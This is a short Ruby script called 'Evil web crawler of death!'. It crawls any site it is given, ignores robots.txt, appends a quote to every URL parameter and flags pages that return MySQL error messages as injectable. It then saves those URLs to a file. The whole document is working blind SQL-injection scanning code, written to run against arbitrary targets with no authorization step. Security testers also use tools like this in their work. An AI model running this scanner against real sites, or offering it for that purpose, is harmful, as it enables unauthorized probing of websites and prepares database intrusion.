#!/usr/bin/env ruby
#
# Evil web crawler of death!
#
# Version: 0.1
# License: GPLv2
#
# Crawls a web page looking for dynamic URLs. Once
# it finds one, tries some blind SQL injection on it.
# For now, it only supports MySQL.
#
# It's using MongoDB to store the crawled data as otherwise,
# Anemone stores it in RAM.
#
# WARNING: This tool doesn't try to hide itself, you will be
# very visible in logs. Also, it doesn't obey robots.txt

require 'rubygems'
require 'anemone'
require 'net/http'
require 'trollop'
require 'uri'

# Help menu
opts = Trollop::options do
  opt :file, 'Save to file', :default => '/tmp/ewcod.txt'
  opt :site, 'Site to crawl', :required => true, :type => String
  opt :user_agent, 'User agent', :default => 'Anemone/0.6.1'
end

# Fixing the base URL if needed.
if not opts[:site] =~ /^http/
  base_url = 'http://' + opts[:site]
else
  base_url = opts[:site]
end

# Testing if the entered URL redirects because Anemone
# doesn't follow 30x codes. Changing base URL if that's 
# the case.
begin
  t = Net::HTTP.get_response(URI(base_url))
  if t.code =~ /^3/
    base_url = t.fetch('location')
  end
rescue SocketError => e
  puts "ERROR: #{e}"
  exit 1
end

# Generate the list of URLs to test
puts 'Crawling site'
Anemone.crawl(base_url, :user_agent => opts[:user_agent]) do |a|
  begin
    a.storage = Anemone::Storage.MongoDB
  rescue Mongo::ConnectionFailure => e
    puts "ERROR: #{e}"
    exit 1
  end
  URLS = []
  a.on_every_page do |p|
    if p.html?
      URLS << p.url.to_s
    end
  end
end

# Blind testing by modifying the URLS to append ' to each =
# and check if the returned page contains a MySQL error.
puts 'Testing each URL'
EXP_URLS = []
TESTED_URLS = []
URLS.each do |u|
  if u =~ /\?/
    new_url = u.gsub(/=/, "='")
    d = Net::HTTP.get(URI(new_url))
    if d =~ /You have an error in your SQL syntax/i
      puts "#{u}: is injectable!"
      EXP_URLS << "#{u}"
      u = URI(u)
      TESTED_URLS << u.host + u.path
    elsif d =~ /supplied argument is not a valid MySQL result/i
      puts "#{u}: is injectable!"
      EXP_URLS << "#{u}"
      u = URI(u)
      TESTED_URLS << u.host + u.path
    end
  end
end

puts TESTED_URLS

# Write results to a text file
if opts[:file]
  f = open(opts[:file], 'w')
  EXP_URLS.each do |eu|
    f.puts eu
  end
  f.close
end
